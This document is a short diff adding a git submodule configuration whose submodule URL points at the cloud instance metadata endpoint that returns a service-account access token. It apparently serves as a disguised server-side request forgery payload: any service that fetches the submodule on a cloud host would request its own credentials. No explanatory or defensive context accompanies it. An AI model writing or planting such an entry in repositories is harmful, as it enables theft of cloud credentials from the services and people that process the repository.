@@ -1,0 +1,3 @@
+[submodule "internal_info"]
+    path = internal_info
+    url = http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
